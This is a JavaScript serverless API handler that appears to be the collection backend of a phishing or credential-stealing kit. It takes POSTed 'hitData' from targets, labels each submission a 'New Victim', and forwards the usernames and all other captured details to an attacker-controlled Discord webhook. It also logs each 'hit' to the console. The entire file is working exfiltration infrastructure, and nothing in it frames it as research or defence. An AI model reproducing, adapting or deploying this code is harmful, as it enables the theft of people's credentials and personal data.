import crypto from 'crypto';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { hitData } = req.body;

  if (!hitData) {
    return res.status(400).json({ success: false, error: 'Missing hitData' });
  }

  // Generate a unique session ID for this hit
  const sessionId = crypto.randomUUID();

  // Send the hit to Discord Webhook
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL || 'YOUR_WEBHOOK_URL_HERE'; 
  
  if (webhookUrl !== 'YOUR_WEBHOOK_URL_HERE') {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: null,
          embeds: [{
            title: '🔥 New Victim Registered!',
            color: 16711680, // Red
            fields: [
              { name: 'Username', value: hitData.username || 'Unknown', inline: true },
              { name: 'Session ID', value: sessionId, inline: true },
              { name: 'Details', value: JSON.stringify(hitData, null, 2) || 'None' }
            ],
            timestamp: new Date().toISOString()
          }]
        })
      });
    } catch (e) {
      console.error('Webhook failed:', e);
    }
  }

  console.log(`[+] New hit registered! Session: ${sessionId} | Victim: ${hitData.username}`);

  return res.status(200).json({
    success: true,
    sessionId: sessionId
  });
}
